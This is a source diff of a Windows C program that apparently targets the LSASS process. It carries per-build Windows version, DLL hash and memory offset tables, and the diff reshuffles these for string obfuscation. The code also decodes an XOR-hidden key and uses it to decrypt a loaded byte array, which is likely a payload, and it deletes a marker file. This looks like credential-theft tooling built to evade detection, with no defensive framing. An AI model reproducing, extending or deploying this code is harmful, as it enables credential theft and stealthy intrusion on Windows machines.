@@ -20,7 +20,7 @@ inline void MYS_ecureZeroMemory(char* fuck, int number) {
 	}
 }
 
-void FBXorCrypt(char* str,  size_t len) {
+void FBXorCrypt(char* str, size_t len) {
 	int intArr[100] = { 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 };
 	int i;
 	for (i = 0; i < len; i++) {
@@ -303,41 +303,7 @@ bool FBFileExists(const char* szPath) {
 		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
 }
 #pragma comment(lib, "Version.lib")
-char version_table[TABLE_LENGTH][50] = {
-	"10.0.19041.1",
-	"10.0.19041.2913",
-	"6.1.7601.17514",
-	"10.0.22621.1",
-	"10.0.14393.0",
-	"10.0.17763.1",
-	"6.1.7601.24214",
-	"6.1.7600.16385",
-	"6.3.9600.16384",
-	"6.1.7601.26561",
-	"10.0.16299.431",
-	"10.0.19041.3324",
-	"10.0.17763.4377",
-	"10.0.17763.4377",
-	"10.0.19041.3570"
-};
-char _md5_table[TABLE_LENGTH][33] = {
-	"e862003aea8c3463f72d7225d1dfbcf0", // 10.0.19041.1
-	"d22e0221ffa5e33b1ef37b104ff55614", // 10.0.19041.2913
-	"6.1.7601.17514",
-	"bba627660c84ba035bdccadbb97285da",	// 10.0.22621.1
-	"10.0.14393.0",
-	"1ba40d15426fe568e443a52e008db1d7", // 10.0.17763.1
-	"6.1.7601.24214",
-	"6.1.7600.16385",
-	"6.3.9600.16384",
-	"6.1.7601.26561",
-	"10.0.16299.431",
-	"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
-	"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
-	"951a238e964be37f74c32564d2a92319", // 10.0.17763.4377
-	"dd8cacce0209e5f7c4c31720e24178f0" // 10.0.19041.3570
 
-};
 DWORD offset_table[TABLE_LENGTH] = {
 	0x32BC3,
 	0x1FA63
@@ -440,6 +406,41 @@ int GetLsvchostsassPid() {
 
 int main()
 {
+/*stringarray*/	char version_table[TABLE_LENGTH][50] = {
+	"10.0.19041.1",
+	"10.0.19041.2913",
+	"6.1.7601.17514",
+	"10.0.22621.1",
+	"10.0.14393.0",
+	"10.0.17763.1",
+	"6.1.7601.24214",
+	"6.1.7600.16385",
+	"6.3.9600.16384",
+	"6.1.7601.26561",
+	"10.0.16299.431",
+	"10.0.19041.3324",
+	"10.0.17763.4377",
+	"10.0.17763.4377",
+	"10.0.19041.3570"
+	};/*endarray*/
+/*stringarray*/	char _md5_table[TABLE_LENGTH][33] = {
+		"e862003aea8c3463f72d7225d1dfbcf0", // 10.0.19041.1
+		"d22e0221ffa5e33b1ef37b104ff55614", // 10.0.19041.2913
+		"6.1.7601.17514",
+		"bba627660c84ba035bdccadbb97285da",	// 10.0.22621.1
+		"10.0.14393.0",
+		"1ba40d15426fe568e443a52e008db1d7", // 10.0.17763.1
+		"6.1.7601.24214",
+		"6.1.7600.16385",
+		"6.3.9600.16384",
+		"6.1.7601.26561",
+		"10.0.16299.431",
+		"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
+		"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
+		"951a238e964be37f74c32564d2a92319", // 10.0.17763.4377
+		"dd8cacce0209e5f7c4c31720e24178f0" // 10.0.19041.3570
+
+	};/*endarray*/
 	if (FBFileExists("C:\\users\\public\\3iaad")) {
 		DeleteFileA("C:\\users\\public\\3iaad");
 	}
@@ -777,7 +778,7 @@ caonimade:
 	char _fuckingstring[100];
 	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 0; FBXorCrypt(_fuckingstring, 8);
 	for (int i = 0; i < fileSize; i++) {
-		byteArray[i] = byteArray[i] ^ (_fuckingstring[i%7]);
+		byteArray[i] = byteArray[i] ^ (_fuckingstring[i % 7]);
 	}
 
 
